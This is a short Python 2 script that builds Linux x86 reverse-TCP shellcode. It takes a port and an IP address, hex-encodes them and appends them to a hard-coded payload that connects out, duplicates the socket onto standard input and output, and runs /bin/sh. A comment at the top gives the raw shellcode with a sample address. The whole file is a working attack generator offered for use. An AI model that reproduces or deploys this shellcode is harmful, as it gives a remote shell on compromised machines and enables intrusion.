#! /usr/bin/python

# This script takes in two arguments (port) (ip).
# and outputs working shellcode (Shell-Reverse-TCP)

# Raw Shellcode with port 31337 (7a69) and ip 127.0.0.1 (7f000001):
# "\xeb\x5c\x31\xc0\x31\xdb\x31\xc9\x5a\x6a\x06\x6a\x01\x6a\x02"
# "\xb0\x66\xb3\x01\x89\xe1\xcd\x80\x89\xc6\x31\xc0\x50\xff\x72"
# "\x02\x66\xff\x32\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\xb0\x66"
# "\xb3\x03\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\x89"
# "\xf3\xcd\x80\x89\xc6\x75\xf4\x31\xc0\x31\xc9\x51\x68\x6e\x2f"
# "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\xb0\x0b\x89\xe1"
# "\x31\xd2\xcd\x80\xe8\x9f\xff\xff\xff\x7a\x69\x7f\x00\x00\x01"

import sys

def main():
	shellcode = '\\xeb\\x5c\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x5a\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x50\\xff\\x72\\x02\\x66\\xff\\x32\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x03\\xfe\\xc9\\xb0\\x3f\\x89\\xf3\\xcd\\x80\\x89\\xc6\\x75\\xf4\\x31\\xc0\\x31\\xc9\\x51\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x51\\x53\\xb0\\x0b\\x89\\xe1\\x31\\xd2\\xcd\\x80\\xe8\\x9f\\xff\\xff\\xff'
	port_hex = ""
	port_final = ""
	ip_array = []
	ip_hex = ""
	ip_final = ""

	# Validate number of args
	if len(sys.argv) < 3:
		print("Please specify PORT and IP as arguments.")
		sys.exit(0)

	# Validate Port arg
	if int(sys.argv[1]) < 1 or int(sys.argv[1]) > 65535:
		print("Port outside expected range (1-65535)")
		sys.exit(0)

	# Validate IP arg
	if int((sys.argv[2]).translate(None,'.')) < 1000 or int((sys.argv[2]).translate(None,'.')) > 255255255255:
		print("Invalid IP.")
		sys.exit(0)

	# Convert Port (integer) to hex string
	port_hex = format(int(sys.argv[1]), '04x')

	for x in range(0, len(str(port_hex)), 2):
		port_final += "\\x" + str(port_hex[x:x+2])

	# Convert IP (x.x.x.x) to hex string
	ip_array = sys.argv[2].split('.')

	for octet in ip_array:
		ip_hex += format(int(octet), '02x')

	for x in range(0, len(str(ip_hex)), 2):
		ip_final += "\\x" + str(ip_hex[x:x+2])

	# Output completed shellcode with Port+IP appended
	print("\"" + shellcode + port_final + ip_final + "\"")
	print("Length: " + str(len(shellcode+port_final+ip_final)/4))
main()
